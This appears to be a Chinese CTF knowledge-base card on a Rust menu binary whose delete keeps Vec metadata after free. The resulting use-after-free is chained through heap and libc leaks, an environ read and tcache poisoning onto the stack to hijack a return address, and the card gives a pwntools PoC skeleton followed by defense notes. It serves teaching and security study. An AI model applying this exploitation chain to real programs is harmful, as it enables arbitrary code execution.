---
id: ctf-pwn-rust-vec-uaf-leak-environ-tcache-stack-backdoor
title: Rust Vec/VecDeque UAF 全链：delete 只 free 不清 len 保留 Vec 元数据，View 复用为任意读 → tcache 投毒到栈改返回地址进后门
type: scenario
domain: ctf
path: ctf/pwn
technique: rust-vec-deque-uaf-leak-environ-tcache-stack
tags:
- ctf
- pwn
- rust
- uaf
- heap
- tcache
- safe-linking
- environ
- stack
- backdoor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:17:51+08:00'
  notes: 已对照原文核对菜单四功能、UAF/LEAK_FLAG 门禁、0x1bcb20 与 environ-0x18、0x650+0x10 栈偏移、base+0x38A70 后门、abs 被改为 a1^0x1177(1131796^0x1177=1135715 已复算)；本次核对未读取图片；已修正首段 safe-linking 方向笔误(泄出的 fd 是 chunk>>12，需左移 12 位还原堆基址)；未在本地复现利用
url: /docs/ctf/pwn/ctf-pwn-rust-vec-uaf-leak-environ-tcache-stack-backdoor/
draft: false
kb_aliases:
- rust but signin
- Rust Vec UAF
- Rust VecDeque get_mut UAF
- delete 不置空 free 后仍保留 len
- safe-linking key<<12 堆泄露
- 一次任意地址读 environ
- 泄漏栈地址 tcache 投毒
---

## 一句话结论

题目的 Rust 菜单程序把 `Vec`/`VecDeque` 的缓冲区 `drop_in_place` 释放后并不清空 `len`/`capacity`（仍保留原 `Vec` 元数据），于是 `delete` 之后再用同一下标 `view`/`append` 就是标准的 UAF：`view` 读到已回收 chunk 里的 `fd` 指针（tcache 链尾时 safe-linking 编码即 `chunk_addr >> 12`，左移 12 位还原堆页基址），继续用 unsorted bin 里的 `main_arena` 指针泄 libc，再用「一次任意地址读」读 `environ` 拿栈地址，最后用 `(chunk>>12) ^ target` 编码把 tcache 的 `fd` 投毒到栈上的返回地址槽，写入 libc 里被改过的 `abs` 后门（`i==1131796` 时 `system("cat /flag")`）拿到 shell。

## 原理

- **漏洞本质在应用层而非 Rust 安全性**：`Vec` 的 `drop` 只释放堆缓冲区，不负责把结构体本身置空。程序为了「重新分配可复用的槽位」自己调用 `drop_in_place::<Vec<_>>`（或等价的手工释放），但结构体里的 `ptr/len/capacity` 原样保留，之后 `VecDeque::get_mut(index)` 仍然按旧 `len` 判界、按旧 `ptr` 取元素，读的是已归还给分配器的内存。安全 Rust 不会产生这种用法，所以这是题目故意造的 `unsafe` 逻辑缺陷。
- **为什么能无限次利用**：正常 `delete` 有门禁——只有 `id ^ do_something(id) == 0xFFFFFFFF` 才把全局 `UAF_FLAG` 置 1，之后每次 `delete` 才真正释放。门禁被解掉后（见另一张卡），`delete` 变成可重复 free，同一指针可被 free 两次，形成 double free。
- **泄露堆地址**：第一次 free 后，chunk 的 `fd` 被 tcache 写成 `next ^ (chunk_addr >> 12)`（safe-linking）；把泄露值左移 12 位即得堆页基址，正好也是后续编码投毒指针要用的 key。
- **泄露 libc**：申请两个 `0x4f0` 的 chunk 再 free，其内容进入 unsorted bin，`fd/bk` 指向 `main_arena` 区域；`view` 读出指针减去固定偏移（本链用 `0x1bcb20`）得到 libc 基址。
- **一次任意地址读的用途**：程序另有一个只能触发一次的「任意读」分支——全局 `LEAK_FLAG==1` 且 `abs(1131796)==v23` 时，直接把 `v23` 当成地址去读 4 字节。注意这里的 `abs` 被魔改成 `a1 ^ 0x1177`，所以 `v23 = 1131796 ^ 0x1177 = 1135715`。libc 基址已知后，用它读 `environ` 附近即可取到栈上的 `envp` 指针。
- **投毒到栈**：栈地址已泄露，把 tcache 的 `fd` 写成 `(chunk_addr>>12) ^ stack_target`（safe-linking 编码），下一次 `malloc(0x80)` 就会返回栈地址；因为「一次 append 最多写 2 个元素」的限制，写入宽度只有 16 字节，但恰好够覆盖菜单函数返回地址，且 `append(x, [backdoor]*2)` 一次能写满两个 8 字节槽。

## 触发条件

- 目标为 Rust 编译的菜单程序，`delete` 走的是「手工释放缓冲区 + 保留结构体元数据」的写法（反编译里能看到 `drop_in_place<...Vec...>` 后 `len` 字段未被清零）；
- 存在可重复触发的 free（本例需先解掉一次 `id` 门禁），或本身就是 double free；
- `view` 不校验「是否已释放」；
- 堆分配器为 glibc，`tcache`/`unsorted bin` 行为可预测，且存在一次可用作任意读的额外分支。

## 利用步骤

1. 逆出菜单四项（create / delete / append / view）与两个全局开关 `UAF_FLAG`、`LEAK_FLAG`；确认 `delete` 释放缓冲后 `len` 未清零。
2. 解 `id` 门禁：`id` 的二进制位决定是否把全局数组的某个 32 位常量异或进结果，`id ^ result == 0xffffffff` 等价于 32 元 GF(2) 线性方程组，解出 `id=3957556225`（过程见关联卡）。
3. `alloc(0x80)` → `append(0, [0x41]*2)` → `free(3957556225)`（开门禁）→ `free(0)` → `view(0,0)`：读到的 `fd` 左移 12 位得 `heap_addr` 与后续投毒用的 `key`。
4. 申请两块 `0x4f0`（进 unsorted bin）→ `free` → `view` 读出 `main_arena` 指针，减 `0x1bcb20` 得 libc 基址；`environ_addr = base + libc.sym['environ'] - 0x18`（对齐到可读槽）。
5. `alloc(0x80)` 三连后依次 `free`，让 tcache 链可写；`append(4, [(key+1) ^ environ_addr])` 把位置 3 的 `fd` 编码成 `environ` 附近地址。
6. 再 `alloc` 两次拿到 `environ` 地址对应的 chunk，用一次任意读（`view(9, 1135715)`）读出 `envp` 指针，跳过 3 行后取第 4 个字段，减去栈帧偏移（本链 `0x650+0x10`，并做 16 字节对齐修正）得返回地址附近。
7. `free` 两块 → `append(11, [(key+2) ^ stack_addr])` 把 tcache 投毒到栈；再 `alloc` 两次，`append(13, [backdoor]*2)` 覆盖保存的返回地址（`base+0x38A70`，即被改过的 `abs`）。
8. 退出菜单触发函数返回，落到 `abs` 后门：`i==1131796` 时执行 `system("cat /flag")`。

## PoC

最小骨架（仅示意流程，未在本机执行；原文 exp 的交互函数略）：

```python
from pwn import *
p = process('./pwn'); lib = ELF('./libc.so.6')

def alloc(sz): ...
def free(i): ...
def append(i, vals): ...
def view(i, j): ...

# 1) 解门禁后用 UAF 泄堆
alloc(0x80); append(0, [0x41]*2)
free(3957556225)          # 满足 id ^ do_something(id) == 0xffffffff，UAF_FLAG 置 1
free(0)                   # 重复 free，进入 tcache
view(0, 0); key = int(recvline().split(' ')[2]); heap = key << 12

# 2) unsorted bin 泄 libc
alloc(0x4f0); alloc(0x4f0); append(1, [0x42]*2); free(1)
view(1, 0); base = int(recvline().split(' ')[2]) - 0x1bcb20
environ = base + lib.sym['environ'] - 0x18

# 3) 投毒到 environ，用一次性任意读取栈
alloc(0x80)  # 3、4、5、6
append(3, [0x41]*2); free(5); free(4); free(3)
append(4, [(key + 1) ^ environ])
alloc(0x80); alloc(0x80); alloc(0x80)   # 7、8、9
view(9, 1135715)                        # abs(1131796) == 1131796^0x1177
for _ in range(3): recvline()
stack = int(recvline().split(' ')[4]) - 0x650 - 0x10
if stack & 0xf == 8: stack += 8

# 4) 投毒到栈，写返回地址进后门
alloc(0x80); alloc(0x80)                # 10、11
free(10); free(11); append(11, [(key + 2) ^ stack])
alloc(0x80); alloc(0x80)                # 12、13
append(13, [base + 0x38A70]*2)
p.interactive()
```

关键编码：tcache `fd` 必须写成 `target ^ (chunk_addr >> 12)`，其中 `chunk_addr>>12` 就是第 1 步 `view` 泄出的 `key`；漏掉 safe-linking 解码会直接 abort。

## 变体与关联

- **变体**：若目标分配器版本开了 `tcache_key`（glibc ≥2.34），double free 会因 `e->key` 非零被检测，需要先通过 `view`/`append` 把 `key` 字段清 0 再做 `tcache dup`；本链先用一次 UAF 写把目标 chunk 的 `key` 抹掉即可。
- **变体**：无 unsorted bin 或无法申请大块时，可直接用「读已释放的 `fd` 得到堆地址 + 从 `bss` 附近全局指针」推 libc；也可把返回地址改成 `setcontext`＋`mprotect` 做 ORW 以绕 seccomp。
- **关联**：[[ctf-pwn-bitmask-xor-global-gate-gf2]]（同一题的前置：解 `id` 门禁）、[[ctf-pwn-vm-heap-uaf-largebin-environ-stack-rop]]（同型链：堆 UAF→environ→栈 ROP，但入口是 VM 指令）、[[binary-pwn-heap-tcache-safe-linking-stack-leak-chunk-to-stack]]（safe-linking 编码规则与栈上分配）、[[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]]（菜单堆题的经典 UAF + tcache 投毒）。

## 检测与防御

- **对 Rust 开发者**：不要用「手工 `drop_in_place` 保留元数据以便复用槽位」的写法；需要复用就用 `Option<Vec<T>>`/带 `Drop` 的包装类型，删除时同时把 `ptr/len/capacity` 清零，或用 `Vec::from_raw_parts` 的配对规则严格转移所有权。`unsafe` 之外 Rust 的借用检查确实能挡住这类错误，但一旦出现裸指针/`ManuallyDrop`/`ptr::read`，检查就失效了，必须人工审计。
- **对 CTF/靶场判题**：`delete` 之后 `view` 仍返回数据就是显式 UAF；`len` 在 free 前后不变是最直接的静态特征。
- **对真实二进制**：glibc 的 `tcache`/`safe-linking` 检测会 abort 掉朴素 double free，因此能在 `free` 后继续 `read` 且不崩溃，通常意味着「结构体元数据与缓冲区所有权被分离」，是 Rust/C++ 容器误用的共性 bug 模式；生产环境可开 `MALLOC_CHECK_`、`glibc.malloc.tcache_count=0` 或使用 `mimalloc`/`hardened_malloc` 提高利用门槛。
